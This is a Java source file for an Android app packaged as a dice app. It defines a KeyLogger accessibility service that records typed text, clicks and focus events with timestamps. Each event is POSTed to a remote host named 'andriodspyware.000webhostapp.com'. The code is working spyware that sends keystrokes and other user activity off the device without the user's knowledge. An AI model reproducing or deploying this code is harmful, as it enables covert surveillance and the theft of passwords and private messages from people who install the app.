package com.example.android.dice;

import android.accessibilityservice.AccessibilityService;
//import android.icu.util.Calendar;
import android.os.AsyncTask;
//import android.os.Build;
import android.view.accessibility.AccessibilityEvent;
//import android.util.Log;

import java.io.BufferedOutputStream;
import java.io.BufferedWriter;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
//import java.sql.Date;
import java.sql.Timestamp;
//import java.text.SimpleDateFormat;
//import java.util.Date;

//import androidx.annotation.RequiresApi;

public class KeyLogger extends AccessibilityService {
    /**
     * This method is called whenever the user types, touches, or interacts with the device.
     * https://developer.android.com/reference/android/view/accessibility/AccessibilityEvent
     * https://developer.android.com/reference/java/security/Timestamp
     */
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // get the data that we may want to send back to our server
        String timestamp = new Timestamp(System.currentTimeMillis()).toString();
        String data = event.getText().toString();
        String[] payload = new String[3];
        // this is whenever the user changes the text in a textview
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            payload[0] = "[" + timestamp + "]";
            payload[1] = "[TEXT_CHANGED]";
            payload[2] = data;

            (new SendToServer()).execute(payload);
            // this is whenever the user clicks or launches apps
        } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            payload[0] = "[" + timestamp + "]";
            payload[1] = "[VIEW_CLICKED]";
            payload[2] = data;
            (new SendToServer()).execute(payload);
            // this is whenever the user changes focus of the app. (eg: clicking on a text view/button)
        } else if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            payload[0] = "[" + timestamp + "]";
            payload[1] = "[VIEW_FOCUSED]";
            payload[2] = data;
            (new SendToServer()).execute(payload);
        }
    }

    @Override
    public void onInterrupt() { }

    /**
     * Background task to post information to our private server
     */
    private static int i = 0;
    private class SendToServer extends AsyncTask<String, Void, Void> {
        @Override
        protected Void doInBackground(String... params) {
            try {
                String timestamp = params[0].replace(" ", "_");
                String type = params[1].replace(" ", "_");
                String data = params[2].replace(" ", "_");
//                Log.d("KeyLogger", payload);
                // TODO: here
                String urlString = "https://andriodspyware.000webhostapp.com/phpcode.php";
                OutputStream out = null;

                try {
                    URL url = new URL(urlString);
                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                    urlConnection.setRequestMethod("POST");
                    urlConnection.setDoOutput(true);
                    out = new BufferedOutputStream(urlConnection.getOutputStream());
                    String post = "DateTime="+timestamp+"&"+"Action="+type+"&"+"Data="+data;
                    i++;
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(out, "UTF-8"));
                    writer.write(post);
                    writer.flush();
                    writer.close();
                    out.close();
                    System.out.println(urlConnection.getResponseCode());
                } catch (Exception e) {
                    System.out.println(e.getMessage());
                }

                //to-do: post to server
            } catch (Exception e) {
                e.printStackTrace();
            }

            return null;
        }
    }
}
